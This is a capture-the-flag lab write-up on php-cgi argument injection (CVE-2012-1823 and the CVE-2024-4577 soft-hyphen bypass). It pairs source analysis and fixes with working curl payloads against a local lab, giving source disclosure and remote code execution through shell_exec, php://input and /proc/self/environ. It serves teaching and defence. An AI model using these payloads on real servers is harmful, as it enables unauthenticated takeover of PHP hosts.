# 16 — Hack the Scoreboard (php-cgi argument injection) — Writeup

## TL;DR

* The CGI spec turns a query string with no unencoded `=` into the child process's
  `argv`. `php-cgi` is a program with command-line options, so the query string is
  an option string.
* PHP's 2012 fix (CVE-2012-1823) only arms itself when `strchr(QUERY_STRING, '=') == NULL`.
  On port 8016 a gateway that builds `argv` anyway gives you
  `?-s+-d+phrack=72` (source disclosure) and
  `?-d+allow_url_include=1+-d+auto_prepend_file=php://input` (RCE).
* On port 9016 the gateway obeys the spec, so the payload must contain no literal
  `=` — and the hyphen is spelled `%AD`. PHP's guard compares the decoded byte
  against `0x2D`, sees `0xAD`, and stands down; the (modelled) Windows ANSI
  conversion then turns `0xAD` into `-` inside `argv`. That is CVE-2024-4577.
* Flag: `PHRACK{one_soft_hyphen_to_rule_the_scoreboard}`.

## The bug

### 1. The CGI specification hands you `argv`

RFC 3875 §4.4 ("The command line"):

> A *query* is a URI query string that contains no unencoded `=`. Such a query is
> interpreted as a list of arguments, split on `+`, each element URL-decoded, and
> supplied to the script as command line arguments.

This exists so that `http://host/finger.cgi?orange+tsai` works like
`finger orange tsai`. It predates the idea that the "script" might be a language
interpreter with its own option parser. For `php-cgi` the consequences are:

| option | effect |
| --- | --- |
| `-s` | print the script, syntax-highlighted, instead of running it |
| `-d name=value` | set an ini directive for this process |
| `-n` | ignore `php.ini` altogether |
| `-c path` | load a `php.ini` of your choosing |
| `-i` | dump `phpinfo()` |
| `-f file` | run a different file |

`-d` alone is game over: `auto_prepend_file` makes PHP include a file of your
choice before the requested script, and `allow_url_include` decides whether that
file may be a stream wrapper such as `php://input`, i.e. your POST body.

### 2. What the 2012 patch really checks

The Eindbazen team found that the defensive logic that used to prevent this had
been lost in a refactor, and reported it during Nullcon HackIM CTF. The fix that
became CVE-2012-1823 is still there today; this is `sapi/cgi/cgi_main.c` from
PHP 8.3.7 (the last release before the WorstFit fix):

```c
	if((query_string = getenv("QUERY_STRING")) != NULL && strchr(query_string, '=') == NULL) {
		/* we've got query string that has no = - apache CGI will pass it to command line */
		unsigned char *p;
		decoded_query_string = strdup(query_string);
		php_url_decode(decoded_query_string, strlen(decoded_query_string));
		for (p = (unsigned char *)decoded_query_string; *p &&  *p <= ' '; p++) {
			/* skip all leading spaces */
		}
		if(*p == '-') {
			skip_getopt = 1;
		}
		free(decoded_query_string);
	}

	php_ini_builder_init(&ini_builder);

	while (!skip_getopt && (c = php_getopt(argc, argv, OPTIONS, &php_optarg, &php_optind, 0, 2)) != -1) {
```

Three properties of that code decide everything in this lab:

1. **It is armed only when the raw query string contains no `=`.** The check is
   `strchr(query_string, '=')` on the *raw* value, not the decoded one. PHP is
   mirroring the server's own rule: if there is an `=`, the server was not
   supposed to build a command line, so PHP does not bother defending.
2. **It only looks at the first non-space character** of the *decoded* string, and
   compares it to the single byte `0x2D`.
3. **It does not stop `php-cgi` from using `argv`.** It only sets `skip_getopt`,
   which skips the option-parsing loop. If anything else puts options in `argv`,
   the loop runs.

The comment that upstream later added above this block is unusually candid about
why they did not simply ignore `argv` in CGI mode:

```c
	/* Apache CGI will pass the query string to the command line if it doesn't contain a '='.
	 * This can create an issue where a malicious request can pass command line arguments to
	 * the executable. Ideally we skip argument parsing when we're in cgi or fastcgi mode,
	 * but that breaks PHP scripts on Linux with a hashbang: `#!/php-cgi -d option=value`.
	 * Therefore, this code only prevents passing arguments if the query string starts with a '-'. */
```

A hashbang compatibility concern is the reason the guard is a string comparison
rather than a structural fix. Hold that thought until the "Fixing it" section.

### 3. Twelve years later: Best Fit

`WideCharToMultiByte(CP_ACP, ...)` is how Windows converts a UTF-16 string to the
process ANSI code page. When a character has no representation in the target code
page, Windows does not drop it or fail — by default it substitutes a *look-alike*.
Orange Tsai and splitline catalogued these mappings in **WorstFit**; the ones that
matter here are:

| char | code point | becomes | code pages |
| --- | --- | --- | --- |
| soft hyphen | `U+00AD` | `-` (`0x2D`) | 932, 936, 950 |
| fullwidth hyphen-minus | `U+FF0D` | `-` | 125x, 874, 932, 949 |
| infinity | `U+221E` | `8` | 1252 |
| fullwidth solidus | `U+FF0F` | `/` | 125x, 874, 932, 949 |
| yen sign | `U+00A5` | `\` | 932 |
| won sign | `U+20A9` | `\` | 949 |

The conversion happens on the way into `argv`, i.e. **after** `cgi_main.c` has
read `QUERY_STRING` and compared its first byte to `0x2D`. So on a Windows box in
a Japanese/Chinese locale:

* `QUERY_STRING` = `%ADs` → guard decodes it to `\xADs` → first byte is `0xAD`,
  not `0x2D` → `skip_getopt` stays `0`;
* `argv` = `["-s"]` after Best Fit → `php-cgi` dumps the source.

That is CVE-2024-4577, and because it needs no `=`, it satisfies the server's own
RFC 3875 rule at the same time. The published payload spells its `=` as `%3D`
for exactly that reason.

## Building the exploit

### Step 0 — the normal page

```console
$ curl -s http://127.0.0.1:8016/ | head -3
<!doctype html>
<title>Scoreboard</title>
```

### Step 1 — the naive attempt, on both ports

```console
$ curl -s 'http://127.0.0.1:8016/?-s' | head -2
<!doctype html>
<title>Scoreboard</title>
```

Nothing. `QUERY_STRING` is `-s`, it contains no `=`, the decoded first character is
`-`, `skip_getopt = 1`, the option loop never runs. The 2012 patch is doing its
job, on a binary from 2026.

### Step 2 — arm the escape hatch (port 8016)

The guard is only armed when there is no `=`. Add one:

```console
$ curl -s 'http://127.0.0.1:8016/?-s+-d+phrack=72' | head -2
<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /></span><span style="color: #FF8000">/*<br />&nbsp;*&nbsp;nullcon-ish&nbsp;scoreboard...
```

The whole source, including the ops comment that says the flag is in `/flag.txt`.
`strchr(query_string, '=')` is now non-NULL, so PHP never even looks at the first
character, and this gateway still passed `["-s", "-d", "phrack=72"]` as `argv`.
`-d phrack=72` is inert padding whose only job is to carry the `=`.

### Step 3 — from source disclosure to code execution

```console
$ curl -s --data-binary '<?php echo shell_exec("id; cat /flag.txt"); ?>' \
    'http://127.0.0.1:8016/?-d+allow_url_include=1+-d+auto_prepend_file=php://input'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
PHRACK{one_soft_hyphen_to_rule_the_scoreboard}
<!doctype html>
...
```

`auto_prepend_file` is included before the scoreboard script; `php://input` is the
request body; `allow_url_include=1` is what makes a stream wrapper acceptable as an
include target. Note that this is still a live ini directive in PHP 8.2 — it was
deprecated in 7.4 but never actually removed, which is why the canonical 2012
payload still works verbatim on a current binary.

If you only want the file and not a shell, `-d auto_prepend_file=/flag.txt` is
enough: the file is included, is not PHP, and is therefore echoed.

### Step 4 — port 9016, where `=` is off the table

The `worstfit` gateway implements RFC 3875 properly, so a query string containing
an unencoded `=` produces **no** `argv` at all:

```console
$ curl -s 'http://127.0.0.1:9016/?-s+-d+phrack=72' | head -2
<!doctype html>
<title>Scoreboard</title>
```

And `?-s` is still blocked by the guard. The way through is to keep the query
string free of `=` (so the server builds `argv`) while making sure the byte the
guard inspects is not `0x2D`:

```console
$ curl -s 'http://127.0.0.1:9016/?%ADs' | head -2
<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /></span>...
```

`%AD` is the soft hyphen. PHP's guard decoded it and compared `0xAD` to `0x2D`.
The Best Fit table turned it into `-` on the way into `argv`. Any of the other
look-alikes work too — `%EF%BC%8D` is `U+FF0D`:

```console
$ curl -s 'http://127.0.0.1:9016/?%EF%BC%8Ds' | head -1
<code><span style="color: #000000">
```

RCE, with every `=` written as `%3D`:

```console
$ curl -s --data-binary '<?php echo shell_exec("cat /flag.txt"); ?>' \
    'http://127.0.0.1:9016/?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input'
PHRACK{one_soft_hyphen_to_rule_the_scoreboard}
```

A gratuitous demonstration that the table is real: `U+221E` (`%E2%88%9E`) is the
digit `8` in cp1252, so `memory_limit=∞M` is `memory_limit=8M`:

```console
$ curl -s 'http://127.0.0.1:9016/?%ADd+memory_limit%3D%E2%88%9EM+%ADd+auto_prepend_file%3D/flag.txt' | head -1
PHRACK{one_soft_hyphen_to_rule_the_scoreboard}
```

## The exploit

`solve/solve.py` (Python 3 stdlib only) runs both modes and asserts they yield the
same flag. Its stages:

1. **Sanity** — `GET /`, confirm the scoreboard renders.
2. **Negative control** — `GET /?-s`, confirm the response is *not* highlighted
   source. This proves the 2012 guard is present and armed; without it the rest of
   the exploit would be meaningless.
3. **Source disclosure** — `GET /?-s+-d+phrack=72` on 8016, `GET /?%ADs` on 9016.
   Both are the "did `argv` reach `php_getopt`?" oracle.
4. **RCE** — `POST` with a PHP body to
   `?-d+allow_url_include=1+-d+auto_prepend_file=php://input` (8016) and to the
   `%AD`/`%3D` spelling of the same thing (9016). The body runs `id` and
   `cat /flag.txt`.
5. **Bonus** — `GET /?%EF%BC%8Ds`, showing a second Best Fit spelling.

Requests are issued with `http.client` and a hand-built request URI so that
nothing in Python re-encodes `%AD` or `%3D` behind our backs — that would silently
destroy the entire technique.

## Fixing it

**As the person running PHP:**

* Do not use `php-cgi` as a CGI binary. Use FPM (`php-fpm`) or `mod_php`. The whole
  class of bug disappears with the process model.
* If you must use CGI, keep PHP up to date: `>= 8.1.29 / 8.2.20 / 8.3.8` for
  CVE-2024-4577, and later still (`8.1.31 / 8.2.26 / 8.3.14`) for the follow-up
  hardening described below. On Windows, XAMPP's default configuration was
  exploitable out of the box.
* Windows-specific: avoid the `php-cgi.exe` mapping entirely (an Apache
  `RewriteRule` that rejects `%AD` in the query string is a stopgap, not a fix),
  and be aware that any locale using cp932/936/950 is in scope.

**As the person writing the web server / gateway:**

* Implement RFC 3875 §4.4 exactly: build `argv` *only* when the raw query string
  contains no unencoded `=` — and honestly, prefer not to implement it at all.
  Modern servers (nginx + FastCGI) never pass a command line, which is why this
  bug does not exist there.
* Do not pass user-controlled data as the beginning of an argument vector. If you
  must, prefix it with `--` or pass it after a `--` terminator so it cannot be
  read as options.

**What upstream did:** the first fix (PHP 8.1.29 / 8.2.20 / 8.3.8, June 2024) tried
to emulate the conversion — take the first decoded byte, run it through
`WideCharToMultiByte(CP_ACP, ...)` and check whether it comes back as `-`:

```c
		/* On Windows we have to take into account the "best fit" mapping behaviour. */
#ifdef PHP_WIN32
		if (*p >= 0x80) {
			wchar_t wide_buf[1];
			wide_buf[0] = *p;
			char char_buf[4];
			size_t wide_buf_len = sizeof(wide_buf) / sizeof(wide_buf[0]);
			size_t char_buf_len = sizeof(char_buf) / sizeof(char_buf[0]);
			if (WideCharToMultiByte(CP_ACP, 0, wide_buf, wide_buf_len, char_buf, char_buf_len, NULL, NULL) == 0
				|| char_buf[0] == '-') {
				skip_getopt = 1;
			}
		}
#endif
```

That is a per-byte emulation of a whole-string transformation, and it did not
survive contact with reality. By PHP 8.1.31 / 8.2.26 / 8.3.14 the block was
replaced with the structural answer, plus a new sentence in the comment:

```c
	 * However, Windows has lots of conversion rules and command line parsing rules that
	 * are too difficult and dangerous to reliably emulate. */
	if((query_string = getenv("QUERY_STRING")) != NULL && strchr(query_string, '=') == NULL) {
#ifdef PHP_WIN32
		skip_getopt = cgi || fastcgi;
#else
		/* ... the 2012 guard, unchanged ... */
#endif
	}
```

On Windows, in CGI or FastCGI mode, options are now simply never parsed. Note that
the Linux branch is *still* the 2012 string comparison — which is exactly why this
lab's `classic` mode is not a museum piece.

**Blast radius, honestly:**

* 2012: every shared-hosting provider that used `php-cgi` for per-user PHP version
  switching and privilege separation, i.e. a very large share of the cheap hosting
  market. Unauthenticated RCE, one GET request, no exploit development required.
  Facebook put an easter egg on its own homepage for `?-s`.
* 2024: every Windows PHP install exposed as `php-cgi.exe`, including default
  XAMPP, in any cp932/936/950 locale. Mass exploitation began within about 48
  hours of the advisory, with ransomware operators among the first at scale. The
  same "unauthenticated, single request, no memory corruption" properties apply.
* This lab's `classic` mode generalises beyond PHP: any gateway that lets request
  data become the front of an `argv` is one option away from arbitrary behaviour
  in *whatever* binary sits behind it.

## Going further

* Not every option is reachable. `?-i+-d+x=1` does *nothing*, and the reason is
  worth reading: `cgi_main.c` has **two** option loops. The first one (which
  handles `-d`, `-c`, `-n`, `-s`, `-b`, ...) always runs; the second one, which
  handles `-i`, `-v`, `-m`, `-l`, is wrapped in `if (!cgi && !fastcgi) { ... }`
  and is therefore unreachable over the web. `-s` lives in the first loop
  (`behavior = PHP_MODE_HIGHLIGHT`), which is why source disclosure works.
  Try `?-n+-d+x=1` too — `php.ini` is ignored entirely for that request.
* Empty-argument trick: a query string of `%00+-s` makes the guard stop at the NUL
  byte (the loop condition is `*p && *p <= ' '`) so `skip_getopt` stays 0 — but
  `php_getopt` stops at the resulting empty `argv` element, so the technique dies
  one step later. Worth reproducing to see a near-miss bypass.
* `allow_url_include` is not strictly required. The gateway copies request headers
  into the child's environment, and a process can read its own environment block:

  ```console
  $ curl -s -H 'X-Payload: <?php echo "HDREXEC:".file_get_contents("/flag.txt"); ?>' \
      'http://127.0.0.1:8016/?-d+auto_prepend_file=/proc/self/environ+-d+x=1' \
      | grep -ao 'HDREXEC:[^<]*'
  HDREXEC:PHRACK{one_soft_hyphen_to_rule_the_scoreboard}
  ```

  Same trick as LFI-to-RCE through `/proc/self/environ`, just reached through
  `-d` instead of through an `include()`.
* WorstFit is much bigger than one CVE: the same mapping table has been used to
  turn filename validation, command quoting and SQL escaping inside out. Read the
  DEVCORE post and try building a payload against something that is not PHP.
* The Windows fix is `skip_getopt = cgi || fastcgi`. What is *not* covered by that
  condition? (Hint: `php-cgi.exe` invoked from a shell, the hashbang case the
  comment worries about.)

## References

* Orange Tsai, *"The Art of PHP - My CTF Journey and Untold Stories!"*, Phrack #72,
  section 5.1.
* Eindbazen, *"PHP-CGI advisory (CVE-2012-1823)"*,
  <http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/> (archived).
* Orange Tsai and Splitline NG, *"WorstFit: Unveiling Hidden Transformers in
  Windows ANSI!"*, DEVCORE, 2025-01-09,
  <https://devco.re/blog/2025/01/09/worstfit-unveiling-hidden-transformers-in-windows-ansi/>
* php-src, `sapi/cgi/cgi_main.c` —
  <https://github.com/php/php-src/blob/master/sapi/cgi/cgi_main.c>
  (compare tags `php-8.3.7`, `php-8.3.8` and `php-8.3.14`).
* RFC 3875, *The Common Gateway Interface (CGI) Version 1.1*, §4.4 "The Command
  Line" — <https://www.rfc-editor.org/rfc/rfc3875#section-4.4>
* NVD: [CVE-2012-1823](https://nvd.nist.gov/vuln/detail/CVE-2012-1823),
  [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577).
